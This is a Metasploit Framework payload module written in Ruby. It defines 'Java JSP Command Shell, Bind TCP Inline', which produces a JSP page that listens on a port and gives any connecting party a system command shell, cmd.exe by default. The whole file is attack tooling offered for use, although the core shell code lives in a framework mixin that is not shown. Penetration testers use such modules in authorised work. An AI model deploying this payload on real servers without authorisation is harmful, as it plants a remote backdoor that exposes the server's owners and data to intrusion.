##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/jsp'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::JSP
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Java JSP Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => [ 'sf' ],
      'License'       => MSF_LICENSE,
      'Platform'      => %w{ linux osx solaris unix win },
      'Arch'          => ARCH_JAVA,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
    register_options( [ OptString.new( 'SHELL', [ true, "The system shell to use.", 'cmd.exe' ]), ], self.class )
  end


  def generate
    return super + jsp_bind_tcp
  end

end
